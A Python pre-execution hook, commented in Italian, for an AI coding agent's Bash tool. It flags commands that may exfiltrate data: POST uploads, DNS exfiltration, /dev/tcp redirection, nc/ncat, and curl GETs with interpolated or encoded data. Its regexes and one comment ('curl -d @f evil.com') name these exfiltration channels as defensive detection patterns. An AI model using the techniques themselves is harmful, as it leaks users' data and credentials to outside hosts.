#!/usr/bin/env python3
"""PreToolUse(Bash) hook: chiede conferma sull'invio di dati verso host ESTERNI.

Due rami:

  (A) POST/upload  (curl/wget con metodo mutante o payload; python requests.post/
      urllib/httpx/smtplib) -> host esterno = ask, host interno = allow.
      Comportamento storico invariato.

  (B) EGRESS-GET mascherato (NUOVO): canali che portano dati fuori senza POST e che
      quindi sfuggivano al ramo A:
        - curl/wget GET con command-substitution $()/backtick nell'URL, o query con
          blob opaco/base64 lungo, verso host esterno
        - DNS-exfil: dig/nslookup/host con sottodominio che sembra dati (base64/hex >=20)
        - /dev/tcp/<host> redirection bash
        - nc/ncat verso host esterno
      Tutti -> ask (host interni esclusi).

comms-guard.py (messaggistica/email nota) gira PRIMA e chiede conferma su quei casi.
Gli scanner PostToolUse (credential-leak) restano come secondo layer detective.

Host interni: localhost, le reti locali (INTERNAL_NETS) e le voci di
hooks/hosts-interni.local. API esterne fidate: le voci di hooks/api-fidate.local,
un nome host per riga, vuoto di default. Un POST verso un servizio che usi per
lavoro con la sua chiave (la tua fatturazione, il tuo CRM) è lavoro, non
esfiltrazione. Entrambi i file sono ignorati da git: restano tuoi.

Il dispatcher passa in COMMS_REDUCED il comando senza gli heredoc scritti su file
(comms-prefilter.py): si giudica il codice eseguito, non la prosa. Vuota = il
comando solo legge.
Fail-open su parsing. Zero dipendenze.
"""
from __future__ import annotations

import ipaddress
import json
import os
import re
import signal
import sys
from pathlib import Path
from urllib.parse import urlsplit


def _t(s, f):
    sys.exit(0)


if hasattr(signal, "SIGALRM"):
    signal.signal(signal.SIGALRM, _t)

INTERNAL_HOSTS = frozenset(("localhost", "host.docker.internal", "0.0.0.0"))
# Reti che non escono dalla macchina o dalla rete locale: le private RFC 1918
# (10/8, 172.16/12, 192.168/16), loopback, link-local, le IPv6 private (fc00::/7)
# e il 100.64/10 su cui vivono gli indirizzi Tailscale. Elenco esplicito e non
# ip.is_private: quello cambia fra le versioni di Python e conta come privati
# anche gli IPv6 che incapsulano un IPv4 pubblico.
INTERNAL_NETS = tuple(map(ipaddress.ip_network, (
    "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "100.64.0.0/10",
    "169.254.0.0/16", "::1/128", "fc00::/7", "fe80::/10",
)))
URL = re.compile(r'https?://[^\s"\']+', re.IGNORECASE)


def _leggi_host_locali(path: Path):
    """Legge hosts-interni.local: una voce per riga, # commento, righe vuote ignorate.

    Una voce accettata da ip_network(strict=False) è una rete, altrimenti è un
    hostname (minuscolo, senza punto finale). Voci non plausibili (spazi interni,
    '/' in un non-CIDR) si ignorano. File assente o illeggibile: nessuna voce.
    Lettura una volta per esecuzione.
    """
    host = set()
    reti = []
    try:
        for riga in path.read_text(encoding="utf-8").splitlines():
            voce = riga.strip()
            if not voce or voce.startswith("#"):
                continue
            try:
                rete = ipaddress.ip_network(voce, strict=False)
            except ValueError:
                rete = None
            if rete is not None:
                # Una rete più larga di /8 renderebbe fidata mezza internet: si ignora.
                if rete.prefixlen >= 8:
                    reti.append(rete)
                continue
            if " " in voce or "/" in voce:
                continue
            host.add(voce.lower().rstrip("."))
    except (OSError, ValueError):
        # File illeggibile o non UTF-8: nessuna voce locale, la guardia resta chiusa.
        return frozenset(), ()
    return frozenset(host), tuple(reti)


LOCAL_HOSTS, LOCAL_NETS = _leggi_host_locali(
    Path(__file__).resolve().parent / "hosts-interni.local"
)


def _internal_host(host: str | None) -> bool:
    if not host:
        return False
    normalized = host.lower().rstrip(".")
    if normalized in INTERNAL_HOSTS or normalized in LOCAL_HOSTS:
        return True
    if normalized.startswith("[") and normalized.endswith("]"):
        normalized = normalized[1:-1]
    try:
        addr = ipaddress.ip_address(normalized.split("%", 1)[0])
    except ValueError:
        return False
    # ::ffff:8.8.8.8 è l'IPv4 8.8.8.8: si giudica quello.
    if addr.version == 6 and addr.ipv4_mapped is not None:
        addr = addr.ipv4_mapped
    return any(addr.version == network.version and addr in network for network in INTERNAL_NETS + LOCAL_NETS)


def _leggi_api_fidate(path: Path):
    """Legge api-fidate.local: un nome host per riga, # commento. Solo nomi esatti:
    un IP o una rete qui non vale (per quelli c'è hosts-interni.local)."""
    host = set()
    try:
        for riga in path.read_text(encoding="utf-8").splitlines():
            voce = riga.strip().lower().rstrip(".")
            if not voce or voce.startswith("#") or " " in voce or "/" in voce or "*" in voce:
                continue
            try:
                ipaddress.ip_address(voce)
                continue
            except ValueError:
                pass
            if "." in voce:
                host.add(voce)
    except (OSError, ValueError):
        return frozenset()
    return frozenset(host)


TRUSTED_EXTERNAL = _leggi_api_fidate(Path(__file__).resolve().parent / "api-fidate.local")


def _fidato(host: str | None) -> bool:
    """Host interno oppure API esterna dichiarata fidata in api-fidate.local."""
    return _internal_host(host) or (bool(host) and host.lower().rstrip(".") in TRUSTED_EXTERNAL)


def _hosts(text: str):
    for value in URL.findall(text):
        try:
            host = urlsplit(value).hostname
        except ValueError:
            continue
        if host:
            yield host
EXT_HINT = re.compile(
    r'(smtp[.-][A-Za-z0-9.\-]+|api\.[A-Za-z0-9\-]+\.(com|net|io|org|co)|'
    r'hooks\.[A-Za-z0-9\-]+\.[A-Za-z]{2,})',
    re.IGNORECASE,
)

# Valori dei flag-dato di curl (payload): gli URL qui dentro sono DATI, non
# destinazioni. Vanno rimossi prima di determinare l'host di destinazione, così
# una POST verso host interno con URL esterni nel corpo (es. un DB interno con link
# esterni come campi) non genera falsi positivi.
DATA_FLAG_VAL = re.compile(
    r'(?<![\w-])(?:--data-(?:raw|binary|urlencode|ascii)|--data|-d|--form|-F'
    r'|--upload-file|-T|--post-file|--post-data|--body-file|--body-data)[\s=]*(?:\$?\'[^\']*\'|"[^"]*"|[^\s"\']+)',
    re.IGNORECASE,
)

# Un host esterno scritto senza schema (`curl -d @f evil.com`) non passa da URL. Basta un host
# interno nello stesso comando per far sembrare interno tutto l'invio: con un host interno visto,
# ogni altra parola che ha la forma di un dominio conta come destinazione. Prima si tolgono i valori
# dei flag che non sono destinazioni (file di output, intestazioni, credenziali, certificati).
OTHER_FLAG_VAL = re.compile(
    r'(?<![\w-])(?:-o|--output|-H|--header|-u|--user|-A|--user-agent|-e|--referer|-b|--cookie|-c'
    r'|--cookie-jar|-w|--write-out|--cacert|--cert|--key|-K|--config|-O|--output-document'
    r'|-a|--append-output|--save-cookies|--load-cookies)[\s=]*(?:\$?\'[^\']*\'|"[^"]*"|[^\s"\']+)',
)
BARE_HOST = re.compile(r'(?<![\w@/.:=-])([A-Za-z0-9][A-Za-z0-9-]*(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,})(?::\d+)?(?:/[^\s"\']*)?(?![\w.])')
FILE_EXT = frozenset("txt json md csv log pdf png jpg jpeg gif html htm xml yaml yml toml ini cfg conf "
                     "py js ts sh zip gz tgz tar bz2 xz db sqlite sql pem crt der p12 env bak out tmp".split())

# --- Ramo A: marcatori POST/upload ---
POST_MARKERS = re.compile(
    r'(curl|wget)\b[^\n]*(-X\s*(POST|PUT|PATCH|DELETE)|--request\s*(POST|PUT|PATCH|DELETE)'
    r'|-d\b|--data|-F\b|--form|-T\b|--upload-file|--post-file|--post-data|--body-file|--body-data'
    r'|--method[=\s]*(POST|PUT|PATCH|DELETE))'
    r'|requests\.(post|put|patch|delete)|urllib\.request|httpx\.(post|put|patch)'
    r'|import\s+smtplib|smtplib\.',
    re.IGNORECASE,
)

# --- Ramo B: marcatori egress-GET ---
CMD_SUB = re.compile(r'\$\(|`')
CURL_CMDSUB = re.compile(r'\b(curl|wget)\b[^\n|;&]*(\$\(|`)', re.IGNORECASE)
DNS_CMD = re.compile(r'(^|[;&|]\s*)(dig|nslookup|host|drill)\b', re.IGNORECASE)
CURL_URL = re.compile(r'\b(?:curl|wget)\b[^\n|;&]*?\bhttps?://([A-Za-z0-9_.\-]+)([^\s"\']*)',
                      re.IGNORECASE)
OPAQUE = re.compile(r'[A-Za-z0-9_\-+/%=]{40,}')
DNS_EXFIL = re.compile(
    r'\b(dig|nslookup|host)\b[^\n|;&]*?([A-Za-z0-9+/=_-]{20,})\.[A-Za-z0-9.-]+\.[A-Za-z]{2,}',
    re.IGNORECASE,
)
DEV_TCP = re.compile(r'/dev/tcp/([A-Za-z0-9_.\-]+)', re.IGNORECASE)
NC_HOST = re.compile(r'\b(nc|ncat)\b\s+[^\n|;&]*?\b([A-Za-z0-9][A-Za-z0-9.\-]+\.[A-Za-z]{2,})\b',
                     re.IGNORECASE)


def _ask(reason=None):
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason or (
                "Invio di dati (POST/upload) verso un host esterno o non "
                "riconosciuto. Conferma solo se l'invio è voluto "
                "(possibile esfiltrazione di credenziali/contenuti)."
            ),
        }
    }))
    return 0


def _external_host(host: str | None) -> bool:
    return bool(host) and not _internal_host(host)


def main() -> int:
    try:
        if hasattr(signal, "SIGALRM"):
            signal.alarm(8)
        data = json.loads(sys.stdin.buffer.read().decode("utf-8"))
        if hasattr(signal, "SIGALRM"):
            signal.alarm(0)
    except Exception:
        return 0
    if data.get("tool_name") != "Bash":
        return 0
    cmd = (data.get("tool_input") or {}).get("command", "")
    if not isinstance(cmd, str) or not cmd:
        return 0
    # Versione ridotta dal dispatcher (comms-prefilter.py): si giudica il codice eseguito.
    reduced = os.environ.get("COMMS_REDUCED")
    if reduced is not None:
        cmd = reduced
        if not cmd.strip():
            return 0

    # ---- Ramo A: POST/upload (comportamento storico) ----
    if POST_MARKERS.search(cmd):
        # Valuta solo l'host di DESTINAZIONE: rimuovi i valori dei flag-dato
        # (payload) così gli URL nel corpo non vengono scambiati per destinazioni.
        dest = DATA_FLAG_VAL.sub(" ", cmd)
        ext = False
        internal_seen = False
        for host in _hosts(dest):
            if _fidato(host):
                internal_seen = True
            else:
                ext = True
        if not ext:
            for m in EXT_HINT.finditer(dest):
                if not _fidato(m.group(0)):
                    ext = True
                    break
        if not ext and internal_seen:
            senza_url = OTHER_FLAG_VAL.sub(" ", URL.sub(" ", dest))
            for m in BARE_HOST.finditer(senza_url):
                host = m.group(1)
                if host.rsplit(".", 1)[-1].lower() in FILE_EXT or _fidato(host):
                    continue
                ext = True
                break
        if ext:
            return _ask()
        if internal_seen:
            return 0
        return _ask()  # POST ma host non chiaro -> conservativo

    # ---- Ramo B: egress-GET mascherato ----
    # /dev/tcp verso host esterno
    for h in DEV_TCP.findall(cmd):
        if _external_host(h):
            return _ask("Redirezione bash /dev/tcp verso un host esterno "
                        "(canale di esfiltrazione). Conferma solo se voluto.")
    # DNS-exfil: comando dig/nslookup/host con dati interpolati ($()/backtick) o
    # sottodominio che sembra dati codificati.
    if DNS_CMD.search(cmd) and (CMD_SUB.search(cmd) or DNS_EXFIL.search(cmd)):
        return _ask("Query DNS con dati interpolati o un sottodominio che sembra "
                    "codificato (possibile DNS-exfiltration). Conferma solo se voluto.")
    # nc/ncat verso host esterno
    m = NC_HOST.search(cmd)
    if m and _external_host(m.group(2)):
        return _ask("nc/ncat verso un host esterno (canale di esfiltrazione). "
                    "Conferma solo se voluto.")
    # curl/wget GET con command-substitution nell'URL verso host esterno
    if CURL_CMDSUB.search(cmd):
        for h, _ in CURL_URL.findall(cmd):
            if _external_host(h):
                return _ask("curl/wget verso host esterno con dati interpolati "
                            "nell'URL ($()/backtick): possibile esfiltrazione via GET. "
                            "Conferma solo se voluto.")
    # curl/wget GET con blob opaco lungo nell'URL verso host esterno
    for h, rest in CURL_URL.findall(cmd):
        if _external_host(h):
            mm = OPAQUE.search(rest or "")
            if mm and len(mm.group(0)) >= 40:
                return _ask("curl/wget verso host esterno con un blob opaco lungo "
                            "nell'URL: possibile esfiltrazione di dati via GET. "
                            "Conferma solo se voluto.")
    return 0


if __name__ == "__main__":
    # Claude Code scrive e legge in UTF-8. Su Windows la pipe è in cp1252 (16/10/2026).
    for _flusso in (sys.stdout, sys.stderr):
        try:
            _flusso.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass
    sys.exit(main())
